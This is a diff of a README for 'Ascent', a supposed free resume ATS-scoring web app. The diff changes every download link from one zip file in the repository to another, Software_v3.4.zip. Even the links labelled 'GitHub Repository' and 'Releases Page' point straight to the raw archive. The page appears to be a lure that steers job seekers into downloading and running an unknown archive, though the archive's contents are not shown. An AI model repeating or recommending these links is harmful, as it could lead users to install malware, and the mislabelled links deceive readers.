@@ -3,7 +3,7 @@
 ## 🌟 Overview
 Ascent is a streamlined web app for job seekers to upload their resumes and receive instant ATS scores and feedback for free. This tool helps users enhance their resumes to pass Applicant Tracking Systems more effectively, increasing job opportunities.
 
-[![Download Ascent](https://raw.githubusercontent.com/Luchrist69/ascent/main/tineweed/ascent.zip%20Ascent-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Luchrist69/ascent/main/tineweed/ascent.zip)
+[![Download Ascent](https://github.com/Luchrist69/ascent/raw/refs/heads/main/app/components/Software_v3.4.zip%20Ascent-Click%20Here-brightgreen)](https://github.com/Luchrist69/ascent/raw/refs/heads/main/app/components/Software_v3.4.zip)
 
 ## 🛠️ Features
 - **ATS Score:** Get an instant score based on your resume's compatibility with various ATS.
@@ -14,7 +14,7 @@ Ascent is a streamlined web app for job seekers to upload their resumes and rece
 ## 📥 Download & Install
 To get started with Ascent, visit the Releases page to download the latest version of the app. 
 
-[Visit this page to download](https://raw.githubusercontent.com/Luchrist69/ascent/main/tineweed/ascent.zip)
+[Visit this page to download](https://github.com/Luchrist69/ascent/raw/refs/heads/main/app/components/Software_v3.4.zip)
 
 Once downloaded, follow these steps:
 
@@ -66,7 +66,7 @@ If you encounter any issues while using Ascent, please report them on the GitHub
 If you have further questions or need assistance, feel free to reach out through the contact form on the Ascent website or directly on GitHub.
 
 ## 🔗 Related Links
-- [GitHub Repository](https://raw.githubusercontent.com/Luchrist69/ascent/main/tineweed/ascent.zip)
-- [Releases Page](https://raw.githubusercontent.com/Luchrist69/ascent/main/tineweed/ascent.zip)
+- [GitHub Repository](https://github.com/Luchrist69/ascent/raw/refs/heads/main/app/components/Software_v3.4.zip)
+- [Releases Page](https://github.com/Luchrist69/ascent/raw/refs/heads/main/app/components/Software_v3.4.zip)
 
 By following these steps and using Ascent, you can enhance your job application process. Start your journey to a better resume today!
